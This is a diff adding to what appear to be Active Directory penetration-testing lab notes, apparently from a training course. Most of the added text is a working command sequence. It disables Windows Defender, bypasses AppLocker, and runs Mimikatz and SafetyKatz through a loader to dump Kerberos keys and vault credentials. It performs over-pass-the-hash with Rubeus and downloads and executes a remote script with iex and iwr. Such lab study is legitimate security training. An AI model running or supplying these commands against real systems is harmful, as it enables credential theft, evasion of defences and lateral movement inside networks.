@@ -107,8 +107,8 @@ Derivative means, if user A in machine A has local admin access on machine B & u
 PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 PS> Find-PSRemotingLocalAdminAccess
 
-#2- App locker check
-#if you attempted to use any script ex. AMSI bypass you will get "Cannot invoke method. Method invocation is supported on core type in this language mode" error
+#2- Applocker check
+#if you attempt to run loader.exe it will result in an error "Cannot invoke method. Method invocation is supported on core type in this language mode" This program is blocked by group policy. Let's check if Applocker is configured.
 PS> $ExecutionContext.SessionState.LanguageMode  #Check language mode
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections  #list app locker policy
 ```
@@ -117,4 +117,54 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections  #list a
 ```powershell
 1-  Rule No.1 Allow every user to run all scripts located in the program files folder
 2-  Rule No.2 Allow every user to run all scripts located in the windows32 folder
+
+# This means you can drop scripts in the program file directory and execute them.
+#1- Disable Windows Defender on the machine
+PS> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+
+#2- Copy Invoke-MimiEx.ps1 to the machine
+PS> Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+
+#3- Run Invoke MimiEx
+PS> cd 'C:\Program File'
+PS> .\Invoke-MimiEx.ps1
+
+#4- Over-Pass-The-Hash
+PS> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
+
+#you will get a new CMD process. Run invishall and PSRemotingLocalAdminAccess.ps1
+PS> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+PS> Find-PSRemotingLocalAdminAccess -Verbose
+
+#5- Copy Loader.exe
+PS> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+PS> winrs -r:dcorp-mgmt cmd
+
+#6- Make sure your port forwarding is on
+PS> netsh interface portproxy show V4tov4
+
+#7- Download and execute SaftyKatz on dcorp-mgmt
+PS> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+
+#8- #4- Over-Pass-The-Hash
+PS> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
+```
+
+# Extracting Credentials from Vault
+```powershell
+# Check local admin access on another machine
+PS> Enter-PSSession -ComputerName dcorp-mgmt
+
+# Don't forget to run sbloggingbypass.txt + AMSI Bypass
+
+# Download and execute Mimikatz
+PS> iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
+PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
+
+# Look for credentials from the credentials vault
+PS> Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
+
+# Over-Pass-The-Hash
+PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<AES256KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
